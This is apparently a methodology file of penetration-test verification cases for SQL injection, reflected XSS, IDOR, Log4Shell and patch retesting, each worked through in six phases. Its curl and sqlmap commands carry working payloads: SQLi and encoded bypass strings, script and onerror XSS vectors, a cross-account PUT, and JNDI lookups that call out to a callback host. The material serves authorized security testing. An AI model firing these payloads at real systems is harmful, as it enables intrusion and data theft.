# Verification Loop — Test Cases

> Structured test scenarios for multi-phase finding verification methodology.

---

## TC-VL-001: SQL Injection Verification

### Scenario
A web application contact form parameter returns a SQL error when a single quote is appended. Verify this is a genuine SQL injection vulnerability using the six-phase verification process.

### Pre-conditions
- Target URL and parameter identified
- Scope authorization confirmed
- sqlmap, curl available

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Define success criteria: database error or data exfiltration confirmed
   - Record baseline: normal response for `?id=1`
   - Set revert plan: no system changes expected (read-only test)

2. **Phase 2: Execute & Observe**
   ```bash
   curl -v "http://target/page?id=1'" 2>&1 | tee evidence/sqli-attempt.txt
   ```

3. **Phase 3: Post-Condition Check**
   - Compare response to baseline
   - Check for SQL error messages (syntax error, unclosed quote, database name)
   - Measure response differences

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different tool — sqlmap
   sqlmap -u "http://target/page?id=1" --batch --dbs

   # Different payload — UNION-based
   curl -s "http://target/page?id=1 UNION SELECT NULL,NULL--"
   ```

5. **Phase 5: False Positive Elimination**
   - Is this WAF returning generic errors? Test without quotes
   - Is this a prepared statement error (safe)? Check if data is actually returned
   - Test with different parameter values

6. **Phase 6: Evidence Documentation**
   - Compile all evidence into verification report
   - Include original finding, confirmation, FP analysis, final verdict

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Pre-condition | Baseline captured, success criteria defined |
| Execute | SQL error or unexpected behavior observed |
| Post-condition | Response differs from baseline measurably |
| Independent | Confirmed with sqlmap AND manual curl |
| FP elimination | Not environment-specific, not tool artifact |
| Evidence | Complete verification report with CONFIRMED verdict |

---

## TC-VL-002: XSS Verification

### Scenario
A reflected XSS finding from an automated scanner needs verification. The scanner reported that the `search` parameter reflects input without encoding.

### Pre-conditions
- Scanner report with URL and parameter
- Browser with DevTools available
- curl for command-line confirmation

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: arbitrary HTML/JS rendered in browser context
   - Baseline: normal search response

2. **Phase 2: Execute & Observe**
   ```bash
   curl -s "http://target/search?q=<script>alert(1)</script>" > evidence/xss-raw.html
   grep -i "<script>alert(1)</script>" evidence/xss-raw.html
   ```

3. **Phase 3: Post-Condition Check**
   - Is the payload reflected unmodified in the response body?
   - What context does it appear in (HTML body, attribute, JavaScript)?

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different vector
   curl -s "http://target/search?q=<img src=x onerror=alert(1)>"

   # Browser test (manual)
   # Open in browser, check if alert fires
   ```

5. **Phase 5: False Positive Elimination**
   - Does it work in multiple browsers?
   - Is Content-Security-Policy blocking execution?
   - Is the payload actually rendered or just present in source?
   - Does it require authentication?

6. **Phase 6: Evidence Documentation**
   - Screenshot of alert firing in browser
   - HTTP request/response capture
   - CSP header analysis

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | Payload reflected in response HTML |
| Independent | Confirmed with different vector AND browser |
| FP elimination | Works without authentication, CSP allows execution |
| Evidence | Screenshot + HTTP capture + CONFIRMED verdict |

---

## TC-VL-003: Authentication Bypass Verification

### Scenario
An IDOR vulnerability is reported: User A can access User B's profile by changing the user ID in the API URL.

### Pre-conditions
- Two test accounts available (User A and User B)
- API endpoint identified
- Valid session tokens for both accounts

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: User A retrieves User B's private data
   - Baseline: User A's own profile data
   - Revert plan: no changes, read-only access test

2. **Phase 2: Execute & Observe**
   ```bash
   # Access User B's profile as User A
   curl -s -H "Authorization: Bearer <user_A_token>" \
     http://target/api/users/2/profile | tee evidence/idor-attempt.json
   ```

3. **Phase 3: Post-Condition Check**
   - Compare response to User B's actual profile data
   - Verify returned data is User B's private information

4. **Phase 4: Independent Confirmation**
   ```bash
   # Method 1: Different endpoint
   curl -s -H "Authorization: Bearer <user_A_token>" \
     http://target/api/users/2/settings

   # Method 2: POST/PUT (write test)
   curl -s -X PUT -H "Authorization: Bearer <user_A_token>" \
     -d '{"email":"test@test.com"}' \
     http://target/api/users/2/profile
   ```

5. **Phase 5: False Positive Elimination**
   - Is the data actually private or publicly accessible?
   - Does the API return the same data for unauthenticated requests?
   - Is the IDOR limited to specific endpoints?

6. **Phase 6: Evidence Documentation**
   - Capture both User A and User B perspectives
   - Document read vs write impact

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | User B's private data returned to User A |
| Independent | Confirmed on multiple endpoints |
| FP elimination | Data is private, requires auth but not authorization |
| Evidence | Full request/response capture + CONFIRMED verdict |

---

## TC-VL-004: Scanner Result Verification

### Scenario
Nessus/Nuclei scanner reported CVE-2021-44228 (Log4Shell) on a Java web application. Verify the finding is genuine.

### Pre-conditions
- Scanner report with CVE ID and affected host
- Target accessible on reported port
- LDAP/DNS callback server available (e.g., interactsh)

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: target connects to callback server via JNDI lookup
   - Baseline: no unexpected outbound connections from target

2. **Phase 2: Execute & Observe**
   ```bash
   # Start callback listener
   interactsh-client

   # Send Log4Shell payload
   curl -s -H "X-Api-Version: \${jndi:ldap://<callback>/test}" \
     http://target/api/health

   # Check callback logs for connection from target IP
   ```

3. **Phase 3: Post-Condition Check**
   - Did the target IP connect to the callback server?
   - What was the timing between request and callback?

4. **Phase 4: Independent Confirmation**
   ```bash
   # Different payload format
   curl -s -H "User-Agent: \${jndi:dns://<callback>/ua}" \
     http://target/api/health

   # Different injection point
   curl -s "http://target/api/search?q=\${jndi:ldap://<callback>/q}"
   ```

5. **Phase 5: False Positive Elimination**
   - Is this version-matched only (no actual exploitation)?
   - Is Log4j actually in the classpath?
   - Is the WAF blocking but returning 200?

6. **Phase 6: Evidence Documentation**
   - Callback server logs showing target connection
   - HTTP request that triggered callback
   - Log4j version confirmation

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Execute | Callback received from target IP |
| Independent | Confirmed via different injection point |
| FP elimination | Log4j confirmed in classpath, not just version match |
| Evidence | Callback logs + request capture + CONFIRMED verdict |

---

## TC-VL-005: Remediation Verification

### Scenario
A previously confirmed SQL injection vulnerability has been patched. Verify the fix is complete and no bypasses exist.

### Pre-conditions
- Original finding report available
- Original and variant payloads documented
- Target accessible for testing

### Test Steps

1. **Phase 1: Pre-Condition Check**
   - Success criteria: ALL original payloads now fail
   - Baseline: original finding evidence

2. **Phase 2: Execute Original Payload**
   ```bash
   # Re-test original payload (should fail)
   curl -s "http://target/page?id=1' OR 1=1--"
   curl -s "http://target/page?id=1' UNION SELECT NULL--"
   ```

3. **Phase 3: Post-Condition Check**
   - Are payloads blocked, sanitized, or returning errors?
   - No data leakage in any response?

4. **Phase 4: Test Variant Bypasses**
   ```bash
   # Encoding bypasses
   curl -s "http://target/page?id=1%27%20OR%201%3D1--"
   curl -s "http://target/page?id=1'/**/OR/**/1=1--"

   # Different SQLi types
   sqlmap -u "http://target/page?id=1" --batch --level=5 --risk=3
   ```

5. **Phase 5: Completeness Check**
   - Are other parameters on the same endpoint also fixed?
   - Are similar endpoints (same code pattern) also fixed?
   - Does the fix handle all HTTP methods (GET, POST, PUT)?

6. **Phase 6: Document Result**
   - PATCHED: all payloads fail
   - PARTIALLY PATCHED: some payloads still work
   - NOT PATCHED: original payload still works

### Expected Outcomes

| Phase | Result |
|-------|--------|
| Original payload | Blocked or sanitized |
| Variant bypasses | All blocked |
| SQLmap comprehensive | No injection found |
| Completeness | All related endpoints verified |
| Verdict | PATCHED / PARTIALLY PATCHED / NOT PATCHED |
